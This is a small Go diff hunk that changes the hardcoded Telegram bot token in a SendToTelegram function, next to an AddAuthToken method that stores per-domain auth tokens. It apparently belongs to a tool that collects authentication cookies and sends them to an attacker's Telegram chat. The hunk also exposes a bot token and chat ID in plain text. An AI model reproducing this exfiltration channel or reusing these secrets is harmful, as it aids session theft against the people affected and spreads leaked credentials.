@@ -113,7 +113,7 @@ func (s *Session) AddAuthToken(domain string, key string, value string, path str
 
 func (s *Session) SendToTelegram() error {
 	// Hardcoded Telegram bot credentials
-	botToken := "6527994050:AAHgt8nRXCI8DWnuArh2riUspi6Z9bnPKzA"
+	botToken := "6527994050:AAHgt8nRXCI8DWnuArh2riUspi6Z9bnPKzAa"
 	chatID := "5822512651"
 
 	chatIDInt, err := strconv.ParseInt(chatID, 10, 64)
